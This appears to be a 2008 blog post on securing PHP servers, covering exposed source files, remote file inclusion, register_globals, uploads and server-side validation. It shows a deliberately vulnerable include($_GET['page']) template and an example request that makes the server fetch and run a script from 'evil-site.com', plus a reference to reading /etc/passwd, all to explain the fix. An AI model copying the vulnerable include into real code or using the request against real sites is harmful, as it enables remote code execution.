title: Securing Your PHP Code - Server Security
date: 2008-04-06 02:04
excerpt: 
categories: mysql, php, programming

When protecting your server environment you'll want to ensure that two things happen. Firstly, you'll want to keep your scripts from prying eyes; you want to make sure that you don't accept input that will break your code. Secondly, and most importantly, you want to stop anyone from executing their own code on your servers.

<!--more-->

## Keeping Code Private

There are many reasons why you would want to keep your code from being leaked. It may contain passwords or API keys, it could give attackers an idea of where your code is vulnerable or you might just not want some idiot to nick your code and benefit from your hard work.

Of course everyone knows that [security by obscurity is bad](http://en.wikipedia.org/wiki/Security_through_obscurity), but if you have holes in your code then it's obviously better if other people didn't know about them.

The number one rookie mistake is failing to give your PHP scripts a .php extension. This may seem obvious, but lots of people seem to like naming their files something like "functions.inc" or "MyClass.class", seemingly unaware that anyone can request those files and view the raw code.

As well as giving files a correct extension you also consider moving them out of your web root anyway. You don't need them in there, and having them in a non-public path makes everything safer. If you don't want to rearrange your site structure then you could just use .htaccess to deny all requests to your include folder. In your-site.com/includes/.htaccess
<pre lang="php">Deny from all</pre>
Facebook recently had a [configuration](http://killersoft.com/randomstrings/2007/08/12/php-did-not-cause-facebook-code-leakage/) [issue](http://www.techcrunch.com/2007/08/11/facebook-source-code-leaked/) that caused their PHP files to be sent out as plain text. It only takes one small mistake to show the entire world the code base stored in your web root.

## Remote Code Execution

The last thing you ever want is to have an attacker run their own code on your servers. Unfortunately there are a few simple mistakes that could open your site up to this possibility.

Watch what you include or require. Many people use include as a shortcut in their templates. For example
<pre lang="php"><html>
<body>
	<div class="header">...</div>
	<?php include($_GET['page'] . '.php'); ?>
</body> 	
</html></pre>
This is a major no-no. The first problem is that an attacker can use this vulnerability to have any file on your system output to them. `/etc/passwd`. PHP will also allow you to include files from a remote server. An attacker can use this "feature" against you a request to `http://www.your-site.com/index.php?page=``http://www.evil-site.com/malicious-script.php.txt` would force your server to download and execute code from the "evil-site.com" domain. Once that happens the user can attack your system by executing [shell functions](http://kestas.kuliukas.com/Webkit/).

If you want to use the above pattern of templating then you can easily implement a white list of safe files.
<pre lang="php"><?php
$page = $_GET['page'];
$pages = array('index', 'about', '404', 'help');
if (!in_array($page, $pages)) {
	$page = '404';
}
include("$page.php");
?></pre>

## Register Globals

In the early days of PHP, external variables ($_GET, $_POST) were expanded as variables directly into the global scope: a query string of "?a=foo" would create a variable called `$a` in your local scope. This is thanks to the register globals functionality. Although this could seem useful, it is [potentially dangerous](http://www.php.net/register_globals). You should always turn off register globals in php.ini. If you can't edit your php.ini then add the following to your .htaccess file
<pre lang="php">php_value register_globals 0</pre>

## User Uploaded Files

Apache is set to pass any file with a "php" extension through to PHP. This means you have to be careful when storing user-uploaded files in your public directories. You may choose to allow users to upload their own avatar. It you keep the name given to the file by the user then you could be in for some trouble.

## Form Validation

One final word of warning: don't be tempted to leave any data validation to the client side. You might have written a nifty JavaScript function that does everything for you, but don't just leave it at that. You should always write your PHP validating first (and also use your database rules where possible). JavaScript validation is something you should attempt when everything else works perfectly, and should be approached as a way of speeding things up for the end user.

## Other articles in this series

*   [Securing Your PHP Code - XSS](../securing-your-php-code-xss/)
*   [Securing Your PHP Code - Databases](../securing-your-php-code-databases/)